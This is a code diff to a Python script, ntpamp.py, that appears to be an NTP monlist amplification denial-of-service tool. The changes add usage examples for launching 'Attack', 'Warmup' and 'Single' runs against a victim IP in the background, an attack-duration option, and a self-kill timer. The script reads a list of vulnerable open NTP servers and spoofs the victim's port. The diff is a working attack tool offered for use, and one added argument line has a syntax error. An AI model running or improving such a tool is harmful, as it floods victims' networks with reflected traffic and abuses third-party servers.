@@ -127,10 +127,21 @@ class NTPAmp(object):
             thread.join()
 
 def argument_parse():
-    parser = argparse.ArgumentParser()
+    examples="""
+        EXAMPLES
+            Warmup: python ntpamp.py -w -v 192.168.179.15 >/dev/null 2>&1 &
+            Attack: python ntpamp.py -v 192.168.179.15 -n 16 >/dev/null 2>&1 &
+            Single: python ntpamp.py -s -v 192.168.179.15 >/dev/null 2>&1 &
+        FILES
+            ntpservs.txt ... Open NTP monlist vulnerable servers list.
+            attack.log   ... attack with this script logs
+            warmpup.log  ... warmup with this script logs
+    """
+    parser = argparse.ArgumentParser(description=examples)
     parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
     parser.add_argument('-s', '--single', action='store_true', help='Execute single get_monlist')
     parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address')
+    parser.add_argument('-t', '--time' type=int, help='time to calculate for attacking (sec. default 60 sec.)', default=60)
     parser.add_argument('-n', '--nthreads',type=int, help='Number of threads (default 1)', default=1)
     parser.add_argument('-f', '--fpath', type=str, help='NTP Servers entry file path (default ./ntpservs.txt)', default='./ntpservs.txt')
     parser.add_argument('--sport', type=int, help='Source port. this port is victim port. (default 8080)', default=8080)
@@ -138,14 +149,14 @@ def argument_parse():
     args = parser.parse_args()
     return args
 
-def spawn_kill_me():
+def spawn_kill_me(sleep_time):
     """
     not test yet
     :return:
     """
     global kill_thread
     def kill_me():
-        time.sleep(5)
+        time.sleep(sleep_time)
         pid = os.getpid()
         os.kill(pid, signal.SIGKILL)
     kill_thread = threading.Thread(target=kill_me)
@@ -159,5 +170,5 @@ if __name__ == '__main__':
     elif args.warmup:
         ntpamp.warmup()
     else:
-        spawn_kill_me()
+        spawn_kill_me(args.time)
         ntpamp.attack()
